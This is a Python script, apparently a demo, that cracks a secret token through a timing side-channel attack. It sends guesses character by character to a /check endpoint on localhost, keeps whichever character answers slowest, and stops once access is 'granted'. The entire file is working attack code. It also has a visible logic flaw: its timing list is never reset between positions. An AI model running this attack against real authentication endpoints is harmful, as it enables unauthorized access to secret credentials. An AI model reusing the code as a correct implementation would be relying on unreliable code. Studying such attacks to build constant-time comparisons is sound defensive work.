import requests
import time
from random import choice

alph = 'abcdefghijklmnopqrstuvwxyz0123456789'
pref = ''
s = requests.Session()
s.get('http://localhost:5000/check', params={'token': 'wrong'})
times = []
cracked = False
last_c = ''
length = 12
colors = [
    '\033[31m',
    '\033[32m',
    '\033[33m',
    '\033[34m',
    '\033[36m',
    '\033[37m'
]
while True:
    for char in alph:
        start = time.perf_counter()
        response = s.get('http://localhost:5000/check', params={'token': pref + char})
        end = time.perf_counter()
        if 'granted' in response.text:
            pref += char
            last_c = char
            cracked = True
            break
        times.append((end - start, char))
    if cracked:
        break
    times.sort()
    pref += (times[-1][1])
    print(f'{choice(colors)}{times[-1][1]}', end='')
    time.sleep(0.1)

print(f'{last_c}\n\033[32m -- cracked secret token, it is {pref}')
